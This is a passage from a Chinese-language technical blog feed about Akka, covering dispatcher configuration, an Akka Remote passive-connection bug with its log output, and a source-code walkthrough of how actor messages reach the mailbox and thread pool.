Actor 消息发生时分派它们。</li></ul><p>第一种可能性特别适用于本质上是单线程的资源，例如<a href="https://cloud.tencent.com/solution/database?from=10680">数据库</a>句柄，传统上一次只能执行一个未完成的查询，并使用内部同步来确保这一点。一种常见的模式是为N个 Actor 创建一个路由器，每个 Actor 包装一个 DB 连接，并处理发送到路由器的查询。然后，必须根据最大吞吐量调整数量N，这将根据部署在哪个硬件上的 DBMS 而有所不同。</p><ul><li><strong>注释</strong>：配置线程池是一项最适合授权给 Akka 的任务，在application.conf中对其进行配置，并通过ActorSystem进行实例化。</li></ul><p>​</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/1435517">https://cloud.tencent.com/developer/article/1435517</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-依赖&quot;&gt;&lt;a href=&quot;#1-依赖&quot; class=&quot;headerlink&quot; title=&quot;1.依赖&quot;&gt;&lt;/a&gt;1.依赖&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;调度器（Dispatchers）是 Akka 核心的一部分，这意味着它们也是akka-actor依赖的一部分</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
  <entry>
    <title>Akka-Remote-问题汇总</title>
    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Remote-%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Remote-%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</id>
    <published>2021-12-03T07:49:51.660Z</published>
    <updated>2021-12-03T09:09:32.955Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-use-passive-connections-bug"><a href="#1-use-passive-connections-bug" class="headerlink" title="1.use-passive-connections bug"></a>1.use-passive-connections bug</h2><p>bug：<a href="https://github.com/akka/akka/issues/24393">https://github.com/akka/akka/issues/24393</a><br>​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">put(<span class="string">&quot;akka.remote.use-passive-connections&quot;</span>, <span class="string">&quot;on&quot;</span>);</span><br><span class="line"><span class="comment">//这个改为100主要是为了提高问题复现概率</span></span><br><span class="line">put(<span class="string">&quot;akka.remote.retry-gate-closed-for&quot;</span>, <span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>在双向链路通道时，由于采用连接复用会造成一端发送另外一端收不到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put(<span class="string">&quot;akka.remote.use-passive-connections&quot;</span>, <span class="string">&quot;off&quot;</span>);</span><br></pre></td></tr></table></figure><p>相关错误日志</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0930 <span class="number">10</span>:<span class="number">22</span>:<span class="number">14</span>,<span class="number">996</span>:DeadLetter:<span class="number">13</span> message: Disassociated [akka.tcp:<span class="comment">//msg@10.3.1.241:1235] -&gt; [akka.tcp://cmp@10.3.1.241:1238]</span></span><br><span class="line">0930 <span class="number">10</span>:<span class="number">22</span>:<span class="number">15</span>,<span class="number">181</span>:DeadLetter:<span class="number">13</span> message: Associated [akka.tcp:<span class="comment">//msg@10.3.1.241:1235] &lt;- [akka.tcp://cmp@10.3.1.241:1238]</span></span><br><span class="line">0930 <span class="number">10</span>:<span class="number">22</span>:<span class="number">15</span>,<span class="number">182</span>:DeadLetter:<span class="number">13</span> message: Disassociated [akka.tcp:<span class="comment">//msg@10.3.1.241:1235] -&gt; [akka.tcp://cmp@10.3.1.241:1238]</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-use-passive-connections-bug&quot;&gt;&lt;a href=&quot;#1-use-passive-connections-bug&quot; class=&quot;headerlink&quot; title=&quot;1.use-passive-connections bug&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
  <entry>
    <title>Akka-Actor-Actor发消息</title>
    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-Actor%E5%8F%91%E6%B6%88%E6%81%AF/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-Actor%E5%8F%91%E6%B6%88%E6%81%AF/</id>
    <published>2021-12-03T07:49:33.192Z</published>
    <updated>2021-12-03T09:07:15.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><h3 id="1-1-示例"><a href="#1-1-示例" class="headerlink" title="1.1 示例"></a>1.1 示例</h3><p>   前面两简单介绍了ActorSystem、actor以及dispatcher和mailbox的创建，下面我们就来看一下actor发消息的内部机制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">val system = ActorSystem(&quot;firstActorSystem&quot;,ConfigFactory.load())</span><br><span class="line">val helloActor = system.actorOf(Props(new HelloActor),&quot;HelloActor&quot;)</span><br><span class="line">helloActor ! &quot;Hello&quot;</span><br></pre></td></tr></table></figure><p>   同样还是回到一个简单的akka应用，通过之前的分析我们知道，helloActor应该是一个RepointableActorRef类型的对象，那么调用 ！ 应该也是调用RepointableActorRef对应的 ！ 方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def !(message: Any)(implicit sender: ActorRef = Actor.noSender) = underlying.sendMessage(message, sender)</span><br></pre></td></tr></table></figure><h3 id="1-2-解析"><a href="#1-2-解析" class="headerlink" title="1.2 解析"></a>1.2 解析</h3><p>   上面是RepointableActorRef对！方法的实现，其实就是调用underlying.sendMessage。怎么样，underliying是不是似曾相似呢？再来看看underliying的定义，它是一个Cell类，不过获取过程稍显复杂啊。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">  * H E R E   B E   D R A G O N S !</span><br><span class="line">  *</span><br><span class="line">  * There are two main functions of a Cell: message queueing and child lookup.</span><br><span class="line">  * When switching out the UnstartedCell for its real replacement, the former</span><br><span class="line">  * must be switched after all messages have been drained from the temporary</span><br><span class="line">  * queue into the real mailbox, while the latter must be switched before</span><br><span class="line">  * processing the very first message (i.e. before Cell.start()). Hence there</span><br><span class="line">  * are two refs here, one for each function, and they are switched just so.</span><br><span class="line">  */</span><br><span class="line"> @volatile private var _cellDoNotCallMeDirectly: Cell = _</span><br><span class="line"> @volatile private var _lookupDoNotCallMeDirectly: Cell = _</span><br><span class="line"> </span><br><span class="line"> def underlying: Cell = Unsafe.instance.getObjectVolatile(this, cellOffset).asInstanceOf[Cell]</span><br><span class="line"> def lookup = Unsafe.instance.getObjectVolatile(this, lookupOffset).asInstanceOf[Cell]</span><br><span class="line"> </span><br><span class="line"> @tailrec final def swapCell(next: Cell): Cell = &#123;</span><br><span class="line">   val old = underlying</span><br><span class="line">   if (Unsafe.instance.compareAndSwapObject(this, cellOffset, old, next)) old else swapCell(next)</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> @tailrec final def swapLookup(next: Cell): Cell = &#123;</span><br><span class="line">   val old = lookup</span><br><span class="line">   if (Unsafe.instance.compareAndSwapObject(this, lookupOffset, old, next)) old else swapLookup(next)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><pre><code> 从官网源码的注释来看，这两个cell的功能进行了严格区分。一个用来消息的出队、入队，一个用来查找child。不过从initialize的逻辑来看，刚开始underlying是一个UnstartedCell实例。</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def sendMessage(msg: Envelope): Unit = &#123;</span><br><span class="line">   if (lock.tryLock(timeout.length, timeout.unit)) &#123;</span><br><span class="line">     try &#123;</span><br><span class="line">       val cell = self.underlying</span><br><span class="line">       if (cellIsReady(cell)) &#123;</span><br><span class="line">         cell.sendMessage(msg)</span><br><span class="line">       &#125; else if (!queue.offer(msg)) &#123;</span><br><span class="line">         system.eventStream.publish(Warning(self.path.toString, getClass, &quot;dropping message of type &quot; + msg.message.getClass + &quot; due to enqueue failure&quot;))</span><br><span class="line">         system.deadLetters.tell(DeadLetter(msg.message, msg.sender, self), msg.sender)</span><br><span class="line">       &#125; else if (Mailbox.debug) println(s&quot;$self temp queueing $&#123;msg.message&#125; from $&#123;msg.sender&#125;&quot;)</span><br><span class="line">     &#125; finally lock.unlock()</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">     system.eventStream.publish(Warning(self.path.toString, getClass, &quot;dropping message of type&quot; + msg.message.getClass + &quot; due to lock timeout&quot;))</span><br><span class="line">     system.deadLetters.tell(DeadLetter(msg.message, msg.sender, self), msg.sender)</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><pre><code> 上面是UnstartedCell的sendMessage的具体实现。从代码来看如果underlying已经ready的话，就调用相应的sendMessage方法否则就把消息暂存到JLinkedList里面，其实就是java的LinkedList；如果暂存失败，则把消息发送到eventStream，并转发给deadLetters。那么underlying怎么判断是ready呢？</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private[this] final def cellIsReady(cell: Cell): Boolean = (cell ne this) &amp;&amp; (cell ne null)</span><br></pre></td></tr></table></figure><pre><code> 这判断方法也挺简单，就是判断RepointableActorRef的underlying和当前的cell指针是不是相同。还记得underlying是怎么初始化的吗？没错，就是一个UnstartedCell。那么underlying什么时候被修改了呢，或者说什么时候ready了呢？这个就要研究RepointableActorRef中用到underlying字段的地方了。</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">def point(catchFailures: Boolean): this.type =</span><br><span class="line">    underlying match &#123;</span><br><span class="line">      case u: UnstartedCell ⇒</span><br><span class="line">        val cell =</span><br><span class="line">          try newCell(u)</span><br><span class="line">          catch &#123;</span><br><span class="line">            case NonFatal(ex) if catchFailures ⇒</span><br><span class="line">              val safeDispatcher = system.dispatchers.defaultGlobalDispatcher</span><br><span class="line">              new ActorCell(system, this, props, safeDispatcher, supervisor).initWithFailure(ex)</span><br><span class="line">          &#125;</span><br><span class="line">        /*</span><br><span class="line">         * The problem here was that if the real actor (which will start running</span><br><span class="line">         * at cell.start()) creates children in its constructor, then this may</span><br><span class="line">         * happen before the swapCell in u.replaceWith, meaning that those</span><br><span class="line">         * children cannot be looked up immediately, e.g. if they shall become</span><br><span class="line">         * routees.</span><br><span class="line">         */</span><br><span class="line">        swapLookup(cell)</span><br><span class="line">        cell.start()</span><br><span class="line">        u.replaceWith(cell)</span><br><span class="line">        this</span><br><span class="line">      case null ⇒ throw new IllegalStateException(&quot;underlying cell is null&quot;)</span><br><span class="line">      case _    ⇒ this // this happens routinely for things which were created async=false</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><pre><code>   还记得initialize最后调用了point么，我们来看看这个函数是干啥的？看到没，它在判断underlying的类型，如果是UnstartedCell做了什么呢？简单来说就是它创建了一个新的ActorCell，然后调用新ActorCell的start函数，最后调用UnstartedCell的replaceWith函数。那么replaceWith做了什么呢？</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def replaceWith(cell: Cell): Unit = locked &#123;</span><br><span class="line">  try &#123;</span><br><span class="line">    def drainSysmsgQueue(): Unit = &#123;</span><br><span class="line">      // using while in case a sys msg enqueues another sys msg</span><br><span class="line">      while (sysmsgQueue.nonEmpty) &#123;</span><br><span class="line">        var sysQ = sysmsgQueue.reverse</span><br><span class="line">        sysmsgQueue = SystemMessageList.LNil</span><br><span class="line">        while (sysQ.nonEmpty) &#123;</span><br><span class="line">          val msg = sysQ.head</span><br><span class="line">          sysQ = sysQ.tail</span><br><span class="line">          msg.unlink()</span><br><span class="line">          cell.sendSystemMessage(msg)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    drainSysmsgQueue()</span><br><span class="line"> </span><br><span class="line">    while (!queue.isEmpty) &#123;</span><br><span class="line">      cell.sendMessage(queue.poll())</span><br><span class="line">      // drain sysmsgQueue in case a msg enqueues a sys msg</span><br><span class="line">      drainSysmsgQueue()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; finally &#123;</span><br><span class="line">    self.swapCell(cell)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>   代码也比较简单，就是先把系统消息取出发送给新的Cell，然后把原来暂存的消息通过sendMessage转发给新Cell。最后调用了原来的swapCell函数，用刚才新创建的ActorCell替换underlying。</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">   * This is called by activate() to obtain the cell which is to replace the</span><br><span class="line">   * unstarted cell. The cell must be fully functional.</span><br><span class="line">   */</span><br><span class="line">  def newCell(old: UnstartedCell): Cell =</span><br><span class="line">    new ActorCell(system, this, props, dispatcher, supervisor).init(sendSupervise = false, mailboxType)</span><br></pre></td></tr></table></figure><pre><code>     我们来看看新ActorCell的创建代码，也比较简单，就是new了一个ActorCell，然后调用init进行初始化。其实分析到这里，基本也就清楚了，helloActor ! &quot;Hello&quot;最终调用了ActorCell的sendMessage方法。不过在ActorCell里面并没有直接找到sendMessage的方法，这是为啥呢？是不是我们分析错了呢。在分析一下newCell方法我们会发现，它并没有直接返回ActorCell，而是返回了ActorCell调用你init之后的对象，我们似乎没有分析init，那就继续看吧。</code></pre><p>通过追踪代码我们发现，init这是ActorCell从Dispatch继承的方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">   * Initialize this cell, i.e. set up mailboxes and supervision. The UID must be</span><br><span class="line">   * reasonably different from the previous UID of a possible actor with the same path,</span><br><span class="line">   * which can be achieved by using ThreadLocalRandom.current.nextInt().</span><br><span class="line">   */</span><br><span class="line">  final def init(sendSupervise: Boolean, mailboxType: MailboxType): this.type = &#123;</span><br><span class="line">    /*</span><br><span class="line">     * Create the mailbox and enqueue the Create() message to ensure that</span><br><span class="line">     * this is processed before anything else.</span><br><span class="line">     */</span><br><span class="line">    val mbox = dispatcher.createMailbox(this, mailboxType)</span><br><span class="line"> </span><br><span class="line">    /*</span><br><span class="line">     * The mailboxType was calculated taking into account what the MailboxType</span><br><span class="line">     * has promised to produce. If that was more than the default, then we need</span><br><span class="line">     * to reverify here because the dispatcher may well have screwed it up.</span><br><span class="line">     */</span><br><span class="line">    // we need to delay the failure to the point of actor creation so we can handle</span><br><span class="line">    // it properly in the normal way</span><br><span class="line">    val actorClass = props.actorClass</span><br><span class="line">    val createMessage = mailboxType match &#123;</span><br><span class="line">      case _: ProducesMessageQueue[_] if system.mailboxes.hasRequiredType(actorClass) ⇒</span><br><span class="line">        val req = system.mailboxes.getRequiredType(actorClass)</span><br><span class="line">        if (req isInstance mbox.messageQueue) Create(None)</span><br><span class="line">        else &#123;</span><br><span class="line">          val gotType = if (mbox.messageQueue == null) &quot;null&quot; else mbox.messageQueue.getClass.getName</span><br><span class="line">          Create(Some(ActorInitializationException(</span><br><span class="line">            self,</span><br><span class="line">            s&quot;Actor [$self] requires mailbox type [$req] got [$gotType]&quot;)))</span><br><span class="line">        &#125;</span><br><span class="line">      case _ ⇒ Create(None)</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    swapMailbox(mbox)</span><br><span class="line">    mailbox.setActor(this)</span><br><span class="line"> </span><br><span class="line">    // ➡➡➡ NEVER SEND THE SAME SYSTEM MESSAGE OBJECT TO TWO ACTORS ⬅⬅⬅</span><br><span class="line">    mailbox.systemEnqueue(self, createMessage)</span><br><span class="line"> </span><br><span class="line">    if (sendSupervise) &#123;</span><br><span class="line">      // ➡➡➡ NEVER SEND THE SAME SYSTEM MESSAGE OBJECT TO TWO ACTORS ⬅⬅⬅</span><br><span class="line">      parent.sendSystemMessage(akka.dispatch.sysmsg.Supervise(self, async = false))</span><br><span class="line">    &#125;</span><br><span class="line">    this</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><pre><code>  首先用dispatcher创建了mailbox，那么dispatcher从哪里来的呢？从Dispatch的定义我们看出，继承Dispatch的一定子类必定是一个ActorCell，那么很明显，这个Dispatch就是子类ActorCell的的dispatcher字段。</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private[akka] trait Dispatch &#123; this: ActorCell ⇒</span><br></pre></td></tr></table></figure><p>从前面的分析我们知道dispatcher是akka.dispatch.Dispatcher的一个实例，下面是createMailbox函数的具体实现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * INTERNAL API</span><br><span class="line"> */</span><br><span class="line">protected[akka] def createMailbox(actor: akka.actor.Cell, mailboxType: MailboxType): Mailbox = &#123;</span><br><span class="line">  new Mailbox(mailboxType.create(Some(actor.self), Some(actor.system))) with DefaultSystemMessageQueue</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是Mailbox的定义，它继承了ForkJoinTask[Unit] 、SystemMessageQueue、Runnable，这好像可以放到线程池去执行的，不过我们先略过不作分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Mailbox and InternalMailbox is separated in two classes because ActorCell is needed for implementation,</span><br><span class="line"> * but can&#x27;t be exposed to user defined mailbox subclasses.</span><br><span class="line"> *</span><br><span class="line"> * INTERNAL API</span><br><span class="line"> */</span><br><span class="line">private[akka] abstract class Mailbox(val messageQueue: MessageQueue)</span><br><span class="line">  extends ForkJoinTask[Unit] with SystemMessageQueue with Runnable</span><br></pre></td></tr></table></figure><p>继续分析init我们发现，它通过swapMailbox方法把新创建的mbox赋值给了mailbox，然后又通过setActor把ActorCell与mailbox进行关联，最后给mailBox发送了一个createMessage。这也不再深入分析，继续回到Dispatch特质。<br>我们发现ActorCell虽然没有实现sendMessage，但它继承的Dispatch实现了这个方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def sendMessage(msg: Envelope): Unit =</span><br><span class="line">    try &#123;</span><br><span class="line">      val msgToDispatch =</span><br><span class="line">        if (system.settings.SerializeAllMessages) serializeAndDeserialize(msg)</span><br><span class="line">        else msg</span><br><span class="line"> </span><br><span class="line">      dispatcher.dispatch(this, msgToDispatch)</span><br><span class="line">    &#125; catch handleException</span><br></pre></td></tr></table></figure><p>很明显，最终调用了dispatcher的dispatch方法，把消息发送出去了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">  * INTERNAL API</span><br><span class="line">  */</span><br><span class="line"> protected[akka] def dispatch(receiver: ActorCell, invocation: Envelope): Unit = &#123;</span><br><span class="line">   val mbox = receiver.mailbox</span><br><span class="line">   mbox.enqueue(receiver.self, invocation)</span><br><span class="line">   registerForExecution(mbox, true, false)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>上面是dispatch的方法，它调用receiver.mailbox的enqueue方法，把消息入队列，然后调用registerForExecution。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Returns if it was registered</span><br><span class="line"> *</span><br><span class="line"> * INTERNAL API</span><br><span class="line"> */</span><br><span class="line">protected[akka] override def registerForExecution(mbox: Mailbox, hasMessageHint: Boolean, hasSystemMessageHint: Boolean): Boolean = &#123;</span><br><span class="line">  if (mbox.canBeScheduledForExecution(hasMessageHint, hasSystemMessageHint)) &#123; //This needs to be here to ensure thread safety and no races</span><br><span class="line">    if (mbox.setAsScheduled()) &#123;</span><br><span class="line">      try &#123;</span><br><span class="line">        executorService execute mbox</span><br><span class="line">        true</span><br><span class="line">      &#125; catch &#123;</span><br><span class="line">        case e: RejectedExecutionException ⇒</span><br><span class="line">          try &#123;</span><br><span class="line">            executorService execute mbox</span><br><span class="line">            true</span><br><span class="line">          &#125; catch &#123; //Retry once</span><br><span class="line">            case e: RejectedExecutionException ⇒</span><br><span class="line">              mbox.setAsIdle()</span><br><span class="line">              eventStream.publish(Error(e, getClass.getName, getClass, &quot;registerForExecution was rejected twice!&quot;))</span><br><span class="line">              throw e</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else false</span><br><span class="line">  &#125; else false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>registerForExecution做了什么呢？很明显它修改了Mailbox的状态使其变成_Scheduled_ 。如果设置成功，则把该Mailbox放到executorService去调度。还记不记得Mailbox都实现了哪些接口呢：ForkJoinTask[Unit] 、SystemMessageQueue、Runnable。它当然是可以被线程池调度的啊。<br>至此消息的发送就已经分析完毕了，通过上面的分析我们知道，发送消息的过程大概就是先把消息通过Mailbox的enque进入队列，当然这默认实现就是akka.dispatch.UnboundedMailbox。Mailbox会在ForkJoinPool（默认是这样的）线程池中申请一个线程进行调度，执行最终的run方法。<br>​</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">override final def run(): Unit = &#123;</span><br><span class="line">   try &#123;</span><br><span class="line">     if (!isClosed) &#123; //Volatile read, needed here</span><br><span class="line">       processAllSystemMessages() //First, deal with any system messages</span><br><span class="line">       processMailbox() //Then deal with messages</span><br><span class="line">     &#125;</span><br><span class="line">   &#125; finally &#123;</span><br><span class="line">     setAsIdle() //Volatile write, needed here</span><br><span class="line">     dispatcher.registerForExecution(this, false, false)</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>下面是run方法的具体实现，也比较简单，就是调用processAllSystemMessages/processMailbox分别处理系统消息和用户发送的消息，当然不会全部把消息处理完毕，会有一定的限制（dispatch的吞吐量参数）。最后设置mailbox状态为idle，然后又调用了dispatcher.registerForExecution，进入下一次线程调度。mailbox这样以循环的方式对队列中的消息进行处理。<br>由于时间关系，今天就先分析到这里。我们已经知道了 ！ 的内部细节，它只是把消息放到了mailbox的队列中，然后mailbox被线程池异步调度，循环处理队列中的数据。当然考虑到多线程，这个队列是一个一致性队列，线程安全。下一篇博文，我们会详细介绍processMailbox的功能，下面只是简单的贴出这个函数的源码，读者也可以先简单分析一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">  * Process the messages in the mailbox</span><br><span class="line">  */</span><br><span class="line"> @tailrec private final def processMailbox(</span><br><span class="line">   left:       Int  = java.lang.Math.max(dispatcher.throughput, 1),</span><br><span class="line">   deadlineNs: Long = if (dispatcher.isThroughputDeadlineTimeDefined == true) System.nanoTime + dispatcher.throughputDeadlineTime.toNanos else 0L): Unit =</span><br><span class="line">   if (shouldProcessMessage) &#123;</span><br><span class="line">     val next = dequeue()</span><br><span class="line">     if (next ne null) &#123;</span><br><span class="line">       if (Mailbox.debug) println(actor.self + &quot; processing message &quot; + next)</span><br><span class="line">       actor invoke next</span><br><span class="line">       if (Thread.interrupted())</span><br><span class="line">         throw new InterruptedException(&quot;Interrupted while processing actor messages&quot;)</span><br><span class="line">       processAllSystemMessages()</span><br><span class="line">       if ((left &gt; 1) &amp;&amp; ((dispatcher.isThroughputDeadlineTimeDefined == false) || (System.nanoTime - deadlineNs) &lt; 0))</span><br><span class="line">         processMailbox(left - 1, deadlineNs)</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.概述&quot;&gt;&lt;/a&gt;1.概述&lt;/h2&gt;&lt;h3 id=&quot;1-1-示例&quot;&gt;&lt;a href=&quot;#1-1-示例&quot; class=&quot;headerlink&quot; title=&quot;1.1 示</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
  <entry>
    <title>Akka-Remote-生命周期</title>
